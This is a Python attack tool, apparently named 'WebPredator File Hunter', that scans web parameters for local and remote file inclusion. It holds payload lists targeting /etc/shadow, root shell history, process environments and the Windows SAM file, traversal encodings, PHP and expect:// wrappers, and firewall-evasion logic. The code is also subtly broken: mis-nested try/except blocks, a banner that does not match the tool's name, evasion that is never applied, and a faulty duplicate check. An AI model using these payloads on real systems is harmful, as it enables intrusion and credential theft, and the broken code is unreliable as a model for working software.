#!/usr/bin/env python3
"""
WebPredator File Hunter - Advanced File Inclusion Scanner
Next-generation LFI/RFI detection with intelligent payload generation
"""

import os
import sys
import re
import argparse
import urllib.parse
import urllib.request
import socket
import threading
import queue
import random
import time
import json
from collections import OrderedDict

# Third-party helper libs
from tqdm import tqdm
import logging
import logging.handlers
import csv
import importlib.util
import pathlib
import requests
import yaml
import base64
import http.cookiejar as cookiejar

# Optional colored output support
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    COLOR_OK = Fore.GREEN
    COLOR_WARN = Fore.YELLOW
    COLOR_ERR = Fore.RED
    COLOR_RESET = Style.RESET_ALL
except ImportError:
    COLOR_OK = COLOR_WARN = COLOR_ERR = COLOR_RESET = ''

# Global Configuration
VERSION = "3.1.0"
BANNER = f"""
    __          __  ______                __ 
   / /_  ____  / /_/ ____/___  ____  ____/ /_
  / __ \/ __ \/ __/ /   / __ \/ __ \/ __  __/
 / /_/ / /_/ / /_/ /___/ /_/ / / / / / / /_  
/_.___/\____/\__/\____/\____/_/ /_/\__/\__/  

Advanced File Inclusion Scanner v{VERSION}
"""

class SecurityShieldDetector:
    """Advanced security shield detection and analysis"""
    SHIELD_SIGNATURES = {
        'CloudShield': r'cloudshield|cs-protect',
        'DefenseMatrix': r'defensematrix|dm-wall',
        'GuardianX': r'guardianx|gx-firewall',
        'IronGate': r'irongate|ig-protect',
        'Fortress': r'fortress-waf',
        'Sentinel': r'sentinel-protect'
    }
    
    def __init__(self, target_url):
        self.target = target_url
        self.detected_shield = None
        self.evasion_methods = []
    
    def detect(self):
        """Detect security shields in place"""
        try:
            headers = {
                'User-Agent': self._random_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            req = urllib.request.Request(self.target, headers=headers)
            response = urllib.request.urlopen(req, timeout=15)
            content = response.read().decode('utf-8', 'ignore').lower()
            headers = str(response.headers).lower()

            for shield, pattern in self.SHIELD_SIGNATURES.items():
                if re.search(pattern, headers + content):
                    self.detected_shield = shield
                    self._prepare_evasion()
                    return shield

            # Check for generic security responses
            if "access denied" in content or "security violation" in content:
                self.detected_shield = "Generic Security Shield"
                self._prepare_evasion()
            
            return self.detected_shield
        
        except Exception as e:
            print(f"[!] Shield detection error: {e}")
            return None
    
    def _prepare_evasion(self):
        """Prepare appropriate evasion techniques"""
        if self.detected_shield == "CloudShield":
            self.evasion_methods = [
                'path-normalization',
                'case-rotation',
                'double-encoding',
                'null-byte'
            ]
        elif self.detected_shield == "DefenseMatrix":
            self.evasion_methods = [
                'unicode-escape',
                'comment-obfuscation',
                'parameter-pollution'
            ]
        else:
            self.evasion_methods = [
                'basic-evasion',
                'random-delay'
            ]
    
    def _random_agent(self):
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        ]
        return random.choice(agents)

class PayloadEngine:
    """Advanced payload generation engine"""
    def __init__(self, os_type=None, advanced=False):
        self.os_type = os_type
        self.advanced = advanced
        self.base_payloads = self._load_base_payloads()
        self.evasion_payloads = self._load_evasion_payloads()
        self.wrappers = self._load_wrappers()
    
    def _load_base_payloads(self):
        """Load base file inclusion payloads"""
        unix_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/group',
            '/etc/hosts',
            '/proc/self/environ',
            '/var/log/apache2/access.log',
            '/root/.bash_history'
        ]
        
        windows_files = [
            'C:\\Windows\\win.ini',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\repair\\SAM',
            'C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*.log'
        ]
        
        if self.os_type == 'windows':
            return windows_files
        elif self.os_type == 'unix':
            return unix_files
        else:
            return unix_files + windows_files
    
    def _load_evasion_payloads(self):
        """Load evasion payloads"""
        return [
            '....//....//....//etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd',
            '..%5c..%5c..%5cwindows%5cwin.ini',
            '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '..\\..\\..\\windows\\win.ini'
        ]
    
    def _load_wrappers(self):
        """Load protocol wrappers"""
        return [
            'php://filter/convert.base64-encode/resource=',
            'php://filter/read=convert.base64-encode/resource=',
            'expect://id',
            'zip://',
            'phar://',
            'data://text/plain;base64,'
        ]
    
    def generate(self, include_wrappers=True):
        """Generate payloads based on configuration"""
        payloads = self.base_payloads
        
        if self.advanced:
            payloads.extend(self.evasion_payloads)
        
        if include_wrappers:
            payloads.extend(self.wrappers)
        
        return payloads
    
    def generate_fuzz_payloads(self):
        """Generate fuzzing payloads for edge cases"""
        base_paths = ['', '/', '../', '..\\', '%2e%2e%2f', '%2e%2e%5c']
        file_patterns = ['etc/passwd', 'windows/win.ini', 'proc/self/environ']
        
        fuzz_payloads = []
        for base in base_paths:
            for pattern in file_patterns:
                for i in range(1, 6):
                    fuzz_payloads.append(base * i + pattern)
        
        return fuzz_payloads

class FileHunter:
    """Core file inclusion scanner"""
    def __init__(self):
        self.config = None
        self.target_url = None
        self.shield_detector = None
        self.payload_engine = None
        self.verified_vulns = []
        self.lock = threading.Lock()
        self.task_queue = queue.Queue()
        self.found = False
        self.os_type = None
        self.session_headers = {
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
    
    def parse_arguments(self):
        """Parse command line arguments"""
        parser = argparse.ArgumentParser(
            description='WebPredator File Hunter - Advanced File Inclusion Scanner',
            formatter_class=argparse.ArgumentDefaultsHelpFormatter
        )
        
        input_group = parser.add_argument_group('Input Options')
        input_group.add_argument('-u', '--url', help='Target URL to scan')
        input_group.add_argument('-f', '--file', help='File containing URLs to scan')
        input_group.add_argument('--data', help='POST data for form submission')
        
        scan_group = parser.add_argument_group('Scan Options')
        scan_group.add_argument('-t', '--threads', type=int, default=5, 
                              help='Number of concurrent threads')
        scan_group.add_argument('-d', '--delay', type=float, default=0.5,
                              help='Delay between requests (seconds)')
        scan_group.add_argument('-T', '--timeout', type=int, default=15,
                              help='Request timeout (seconds)')
        scan_group.add_argument('--deep', action='store_true',
                              help='Enable deep scanning mode')
        
        technique_group = parser.add_argument_group('Technique Options')
        technique_group.add_argument('--advanced', action='store_true',
                                   help='Use advanced evasion techniques')
        technique_group.add_argument('--fuzz', action='store_true',
                                   help='Enable payload fuzzing')
        technique_group.add_argument('--skip-shield', action='store_true',
                                   help='Skip security shield detection')
        technique_group.add_argument('--os', choices=['unix', 'windows'],
                                   help='Force OS type detection')
        technique_group.add_argument('--rfi', action='store_true',
                                   help='Enable Remote File Inclusion testing')
        
        output_group = parser.add_argument_group('Output Options')
        output_group.add_argument('-v', '--verbose', action='store_true',
                                help='Enable verbose output')
        output_group.add_argument('-o', '--output', 
                                help='Output file for results')
        output_group.add_argument('--log-file', help='Path to log file')
        output_group.add_argument('--no-progress', action='store_true',
                                help='Disable progress bars')
        output_group.add_argument('--color', action='store_true', help='Enable color output')
        # Additional professional options
        input_group.add_argument('--config', help='Load settings from YAML/JSON file')
        input_group.add_argument('--auth', help='Basic auth credentials user:pass')
        input_group.add_argument('--cookies', help='Netscape/Mozilla cookies.txt file')
        output_group.add_argument('--report-format', choices=['json','csv','sarif'], default='json', help='Output format when --output provided')
        output_group.add_argument('--debug', action='store_true', help='Enable debug log level')
        output_group.add_argument('--self-update', action='store_true', help='Update tool to latest version')
        input_group.add_argument('--plugins-dir', default='plugins', help='Directory containing plugin *.py files')
        output_group.add_argument('--webhook', help='Webhook URL to POST the report')
        
        self.config = parser.parse_args()
        if self.config.self_update:
            try:
                import updater
                updater.self_update(VERSION)
            except Exception as e:
                print(f"[!] Self-update failed: {e}")
        # Auto threads if 0
        if self.config.threads == 0:
            self.config.threads = (os.cpu_count() or 2) * 2
        # Load external config file if provided
        if self.config.config:
            try:
                with open(self.config.config, 'r', encoding='utf-8') as f:
                    if self.config.config.endswith(('.yml', '.yaml')):
                        cfg_data = yaml.safe_load(f)
                    else:
                        cfg_data = json.load(f)
                for k, v in cfg_data.items():
                    if hasattr(self.config, k) and getattr(self.config, k) in [None, False, 0, '']:
                        setattr(self.config, k, v)
            except Exception as e:
                print(f"[!] Failed to load config file: {e}")

        # Handle cookies
        self.cookie_header = None
        if self.config.cookies and os.path.isfile(self.config.cookies):
            try:
                cj = cookiejar.MozillaCookieJar(self.config.cookies)
                cj.load(ignore_discard=True, ignore_expires=True)
                self.cookie_header = '; '.join([f"{c.name}={c.value}" for c in cj])
            except Exception as e:
                print(f"[!] Cookie load error: {e}")

        # Parse auth
        self.auth_header = None
        if self.config.auth and ':' in self.config.auth:
            token = base64.b64encode(self.config.auth.encode()).decode()
            self.auth_header = f"Basic {token}"

        # Load plugins directory path
        self.plugins_dir = pathlib.Path(self.config.plugins_dir)
        if self.plugins_dir.is_dir():
            self._load_plugins()

        # Initialize logger
        self._init_logger()
        
        if not any([self.config.url, self.config.file]):
            parser.print_help()
            sys.exit(1)
    
    def send_request(self, url, method='GET', data=None):
        """Send HTTP request and return response"""
        try:
            headers = self.session_headers.copy()
            headers['User-Agent'] = self._random_agent()
            if self.cookie_header:
                headers['Cookie'] = self.cookie_header
            if self.auth_header:
                headers['Authorization'] = self.auth_header
            
            if method.upper() == 'POST' and data:
                data = urllib.parse.urlencode(data).encode()
                req = urllib.request.Request(url, data=data, headers=headers, method='POST')
            else:
                req = urllib.request.Request(url, headers=headers)
            
            response = urllib.request.urlopen(req, timeout=self.config.timeout)
            return response.read().decode('utf-8', 'ignore')
        
        except urllib.error.HTTPError as e:
            if self.config.verbose:
                print(f"[!] HTTP Error: {e.code} for {url}")
        except urllib.error.URLError as e:
            if self.config.verbose:
                print(f"[!] URL Error: {str(e)} for {url}")
        except Exception as e:
            if self.config.verbose:
                print(f"[!] Request Error: {str(e)} for {url}")
        
        return None
    
    def _random_agent(self):
        """Get random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        ]
        return random.choice(agents)
    
        # --- Logger helper ---
    # --- Plugin system ---
    def _load_plugins(self):
        self.extra_payloads = []
        self.post_hooks = []
        for py_file in self.plugins_dir.glob('*.py'):
            spec = importlib.util.spec_from_file_location(py_file.stem, py_file)
            module = importlib.util.module_from_spec(spec)
            try:
                spec.loader.exec_module(module)  # type: ignore
                if hasattr(module, 'register'):
                    module.register(self)
            except Exception as e:
                print(f"[!] Plugin load failure {py_file}: {e}")

    # Helper methods for plugins to register
    def register_payload(self, payload):
        self.extra_payloads.append(payload)

    def register_hook(self, func):
        self.post_hooks.append(func)

    # --- Logger setup ---
    def _init_logger(self):
        self.logger = logging.getLogger('FileHunter')
        if self.logger.handlers:
            return
        level = logging.DEBUG if (self.config.debug or self.config.verbose) else logging.INFO
        self.logger.setLevel(level)
        handler = logging.StreamHandler(sys.stdout)
        handler.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
        self.logger.addHandler(handler)
        if getattr(self.config, 'log_file', None):
            fh = logging.FileHandler(self.config.log_file, encoding='utf-8')
            fh.setFormatter(logging.Formatter('[%(levelname)s] %(asctime)s %(message)s'))
            self.logger.addHandler(fh)

    def detect_os(self, response):
        """Detect operating system from response"""
        if self.config.os:
            return self.config.os
        
        windows_patterns = [r'\[boot loader\]', r'\[fonts\]', r'C:\\']
        unix_patterns = [r'root:/', r'/bin/', r'/etc/', r'sbin/nologin']
        
        for pattern in windows_patterns:
            if re.search(pattern, response, re.I):
                return 'windows'
        
        for pattern in unix_patterns:
            if re.search(pattern, response, re.I):
                return 'unix'
        
        return None
    
    def test_inclusion(self, url, param, payload, method='GET'):
        """Test for file inclusion vulnerability"""
        test_url = self._inject_payload(url, param, payload, method)
        
        if method.upper() == 'GET':
            response = self.send_request(test_url)
        else:
            # Handle POST requests
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            params.update(urllib.parse.parse_qs(self.config.data)) if self.config.data else None
            params[param] = payload
            response = self.send_request(url, method='POST', data=params)
        
        if response:
            indicators = [
                r'root:/', r'\[boot loader\]', r'PHP Warning',
                r'Failed opening', r'<title>Index of /',
                r'sbin/nologin', r'daemon:x:\d+:\d+:MySQL Server'
            ]
            
            for pattern in indicators:
                if re.search(pattern, response, re.I):
                    self.os_type = self.detect_os(response)
                    with self.lock:
                        if test_url not in self.verified_vulns:
                            self.verified_vulns.append({
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'method': method,
                                'type': 'LFI' if not payload.startswith('http') else 'RFI'
                            })
                            print(f"[+] {self.verified_vulns[-1]['type']} Found: {test_url}")
                            print(f"    Parameter: {param}")
                            print(f"    Payload: {payload[:60] + '...' if len(payload) > 60 else payload}")
                            self.found = not self.config.deep
                            return True
        
        return False
    
    def test_rfi(self, url, param):
        """Test for Remote File Inclusion"""
        test_server = "http://example.com/test.txt"
        payload = f"{test_server}?"
        return self.test_inclusion(url, param, payload)
    
    def _inject_payload(self, url, param, payload, method='GET'):
        """Inject payload into target URL"""
        if method.upper() == 'POST':
            return url  # POST data handled separately
        
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        if param in query:
            query[param] = [payload]
        else:
            # Handle path parameters
            path = parsed.path
            if '{' in path and '}' in path:
                path = path.replace('{' + param + '}', payload)
            
            new_parsed = parsed._replace(path=path)
            return urllib.parse.urlunparse(new_parsed)
        
        new_query = urllib.parse.urlencode(query, doseq=True)
        new_parsed = parsed._replace(query=new_query)
        return urllib.parse.urlunparse(new_parsed)
    
    def worker(self):
        """Worker thread for concurrent scanning"""
        while not self.task_queue.empty() and not self.found:
            task = self.task_queue.get()
            url, param, payload = task
            
            if self.config.rfi and payload.startswith('http'):
                self.test_rfi(url, param)
            else:
                self.test_inclusion(url, param, payload)
            
            if self.config.delay > 0:
                time.sleep(self.config.delay)
            
            self.task_queue.task_done()
            # progress update
            with self.lock:
                if hasattr(self, 'progress'):
                    self.progress.update(1)
    
    def _fingerprint_target(self, url):
        """Passive fingerprinting to guess OS / server"""
        try:
            r = requests.head(url, timeout=5, allow_redirects=True)
            server = r.headers.get('Server','').lower()
            if 'win' in server or 'iis' in server:
                return 'windows'
            if 'apache' in server or 'nginx' in server:
                return 'unix'
        except Exception:
            pass
        return None

    def scan_target(self, url, params=None, method='GET'):
        """Scan a single target URL"""
        print(f"[*] Scanning: {url}")
        # Passive fingerprinting
        if not self.os_type:
            fp_res = self._fingerprint_target(url)
            if fp_res:
                self.os_type = fp_res
        
        if not params:
            parsed = urllib.parse.urlparse(url)
            params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
        
        # Initialize payload engine
        self.payload_engine = PayloadEngine(
            os_type=self.os_type,
            advanced=self.config.advanced
        )
        
        # Generate and queue payloads
        payloads = self.payload_engine.generate()
        payloads.extend(getattr(self, 'extra_payloads', []))
        total_jobs = len(params) * len(payloads) if params else len(payloads)
        self.progress = tqdm(total=total_jobs, disable=(self.config.no_progress or not self.config.verbose), desc="Testing")
        
        if self.config.fuzz:
            payloads.extend(self.payload_engine.generate_fuzz_payloads())
        
        for param in params.keys():
            for payload in payloads:
                self.task_queue.put((url, param, payload))
        
        # Start worker threads
        threads = []
        for _ in range(self.config.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Wait for completion
        self.task_queue.join()
        if hasattr(self, 'progress'):
            self.progress.close()
    
    def run_scan(self):
        """Execute the complete scanning process"""
        print(BANNER)
        self.parse_arguments()
        
        # Initialize shield detection
        if not self.config.skip_shield and self.config.url:
            self.shield_detector = SecurityShieldDetector(self.config.url)
            shield = self.shield_detector.detect()
            if shield:
                print(f"[!] Security Shield Detected: {shield}")
                print(f"[*] Applying Evasion: {', '.join(self.shield_detector.evasion_methods)}")
        
        # Process input targets
        if self.config.file:
            with open(self.config.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            
            for target in targets:
                self.target_url = target
                if self.config.data:
                    method = 'POST'
                    params = urllib.parse.parse_qs(self.config.data)
                else:
                    method = 'GET'
                    params = None
                
                self.scan_target(target, params, method)
        
        elif self.config.url:
            self.target_url = self.config.url
            if self.config.data:
                method = 'POST'
                params = urllib.parse.parse_qs(self.config.data)
            else:
                method = 'GET'
                params = None
            
            self.scan_target(self.config.url, params, method)
        
        # Generate report
        self._generate_report()
        print("\n[+] Scan completed!")
        # Execute post-scan hooks from plugins
        for hook in getattr(self, 'post_hooks', []):
            try:
                hook(self)
            except Exception as e:
                print(f"[!] Post-hook error: {e}")
    
    def _generate_report(self):
        """Generate scan report"""
        if not self.verified_vulns:
            print("[-] No file inclusion vulnerabilities found")
            return
        
        print("\n[+] Vulnerabilities Found:")
        for vuln in self.verified_vulns:
            print(f"\nType: {vuln['type']}")
            print(f"URL: {vuln['url']}")
            print(f"Method: {vuln['method']}")
            print(f"Parameter: {vuln['parameter']}")
            print(f"Payload: {vuln['payload']}")
        
        if self.config.output:
            fmt = getattr(self.config, 'report_format', 'json').lower()
            try:
                if fmt == 'csv':
                    with open(self.config.output, 'w', newline='', encoding='utf-8') as f:
                        writer = csv.DictWriter(f, fieldnames=self.verified_vulns[0].keys())
                        writer.writeheader()
                        writer.writerows(self.verified_vulns)
                elif fmt == 'sarif':
                    sarif = {
                        "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0.json",
                        "version": "2.1.0",
                        "runs": [{
                            "tool": {"driver": {"name": "WebPredator FileHunter", "version": VERSION}},
                            "results": [
                                {
                                    "ruleId": v['type'],
                                    "level": "error",
                                    "message": {"text": f"{v['type']} via {v['parameter']}"},
                                    "locations": [{
                                        "physicalLocation": {"artifactLocation": {"uri": v['url']}}
                                    }]
                                } for v in self.verified_vulns]
                        }]
                    }
                    with open(self.config.output, 'w', encoding='utf-8') as f:
                        json.dump(sarif, f, indent=2)
                else:
                    with open(self.config.output, 'w', encoding='utf-8') as f:
                        json.dump(self.verified_vulns, f, indent=2)
                print(f"\n[+] Report ({fmt}) saved to {self.config.output}")
            # Send webhook if requested
            if self.config.webhook:
                try:
                    requests.post(self.config.webhook, json=self.verified_vulns, timeout=10)
                    print(f"[+] Report sent to webhook {self.config.webhook}")
                except Exception as e:
                    print(f"[!] Webhook error: {e}")
            except Exception as e:
                print(f"[!] Report writing error: {e}")

if __name__ == '__main__':
    try:
        scanner = FileHunter()
        scanner.run_scan()
except KeyboardInterrupt:
        scanner._generate_report()
        print("\n[!] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Critical Error: {str(e)}")
        sys.exit(1)